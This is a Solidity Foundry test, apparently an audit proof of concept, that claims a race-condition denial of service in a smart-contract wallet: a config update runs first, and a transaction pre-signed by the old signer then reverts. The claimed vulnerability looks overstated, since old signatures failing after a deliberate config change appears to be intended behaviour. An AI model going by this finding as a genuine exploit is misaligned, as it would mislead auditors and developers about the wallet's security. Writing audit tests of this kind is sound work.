// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "test/integrations/extensions/sessions/ExtendedSessionTestBase.sol";
import "../src/Stage1Module.sol";
import "../src/modules/Payload.sol";
import "../src/modules/Nonce.sol";

// ATTACK TIMELINE:
// 1. [Setup] Deploy contracts, create Wallet with identityWallet as signer.
// 2. [T=0] Attacker/Victim prepares Transaction A (nonce=1) to update the Wallet's imageHash (config update).
// 3. [T=1] Attacker/Victim prepares Transaction B (nonce=2) for a regular operation, signed by the OLD signer set (identityWallet).
// 4. [T=2] Transaction A executes first, successfully updating the on-chain imageHash.
// 5. [T=3] Transaction B attempts to execute. Because signature validation uses the current on-chain state, the OLD signature is now invalid.
// 6. [Assert] Transaction B reverts, proving the temporal race condition / DoS at the config-update boundary.

contract AuditAgentPoC is ExtendedSessionTestBase {
    function test_exploit() public {
        // 1. Setup: Create Wallet with default topology (identityWallet is the signer)
        string memory topology = _createDefaultTopology();
        (Stage1Module target, string memory config, bytes32 oldImageHash) = _createWallet(topology);

        // Fund the Wallet for execution
        vm.deal(address(target), 10 ether);

        // 2. Prepare Transaction A (nonce 1): Configuration update
        // We use selfExecute to call updateImageHash on the Wallet itself
        Payload.Decoded memory payloadA = _buildPayload(1);
        payloadA.space = 1;
        payloadA.nonce = 1;
        payloadA.calls = new Payload.Call[](1);

        bytes32 newImageHash = keccak256("new_config");
        bytes memory updateData = abi.encodeWithSignature("updateImageHash(bytes32)", newImageHash);
        payloadA.calls[0] = Payload.Call({
            to: address(target),
            value: 0,
            data: updateData,
            gasLimit: 0,
            delegateCall: false,
            onlyFallback: false,
            behaviorOnError: Payload.BehaviorOnError.REVERT
        });

        // Sign Transaction A with the current valid signer (identityWallet)
        uint8[] memory permIdxsA = new uint8[](0);
        bytes memory sigA = _validExplicitSignature(payloadA, identityWallet, config, topology, permIdxsA);

        // 3. Prepare Transaction B (nonce 2): Regular operation signed by OLD signer set
        Payload.Decoded memory payloadB = _buildPayload(1);
        payloadB.space = 1;
        payloadB.nonce = 2;
        payloadB.calls = new Payload.Call[](1);
        payloadB.calls[0] = Payload.Call({
            to: address(mockTarget),
            value: 0,
            data: "0x12345678",
            gasLimit: 0,
            delegateCall: false,
            onlyFallback: false,
            behaviorOnError: Payload.BehaviorOnError.REVERT
        });

        // Sign Transaction B with the OLD signer (identityWallet) BEFORE config update executes
        uint8[] memory permIdxsB = new uint8[](0);
        bytes memory sigB = _validExplicitSignature(payloadB, identityWallet, config, topology, permIdxsB);

        // 4. Execute Transaction A (updates config)
        target.execute(PrimitivesRPC.toPackedPayload(vm, payloadA), sigA);
        console.log("Step 4: Config updated via Transaction A");

        // 5. Execute Transaction B (should fail because identityWallet is no longer valid under newImageHash)
        // The signature was made by the old signers, but the on-chain state has changed.
        console.log("Step 5: Attempting to execute Transaction B with old signature...");
        vm.expectRevert(); // Reverts due to invalid signature / insufficient weight under new config
        target.execute(PrimitivesRPC.toPackedPayload(vm, payloadB), sigB);

        // 6. Assert: The test passing with vm.expectRevert proves the DoS / ordering vulnerability
        // where a pre-signed transaction becomes invalid if a config update front-runs it in the same nonce space.
    }
}
